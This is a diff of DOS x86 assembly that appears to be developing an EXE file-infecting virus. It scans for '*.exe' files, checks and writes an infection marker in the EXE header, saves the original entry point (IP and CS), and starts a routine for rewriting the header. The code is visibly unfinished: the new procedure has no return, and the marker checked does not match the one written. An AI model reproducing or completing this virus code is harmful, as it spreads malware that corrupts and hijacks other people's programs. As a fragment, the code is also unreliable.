@@ -42,11 +42,19 @@ lea dx,header
 int 21h
 
 ; check for infection
-cmp byte ptr cs:[header+13h], 69h
+cmp header[13h], 69h
 jz find_next
 
 ; saving file_descriptor
 mov file_descriptor, bx
+
+; saving ip0 & cs0
+mov ax, word ptr header[14h]
+mov old_ip, ax
+mov ax, word ptr header[16h]
+mov old_cs, ax
+
+call calculate_header
 
 ; closing file
 mov ah, 3eh
@@ -67,6 +75,25 @@ int 21h
 
 procedures:
 
+; the new header vals calc proc
+calculate_header proc
+
+; stash registers values
+push ax
+push bx
+push cx
+push dx
+
+; infection mark
+mov header[13h],'3'
+
+; filesize
+mov ax, word ptr file.fsize[0]
+mov dx, word ptr file.fsize[2]
+
+calculate_header endp
+
+; converting file-str to console-str in dx
 str_f2c proc
     push cx
     push bx
@@ -87,6 +114,7 @@ str_f2c proc
     jmp str_f2c_popret
 str_f2c endp
 
+; converting console-str to file-str in dx
 str_c2f proc
     push cx
     push bx
@@ -123,5 +151,7 @@ file DTAFileInfo <>
 file_descriptor dw, ?
 file_mask db '*.exe*', 0
 header db 1ah dup(?)
+old_ip dw, ?
+old_cs dw, ?
 
 end start
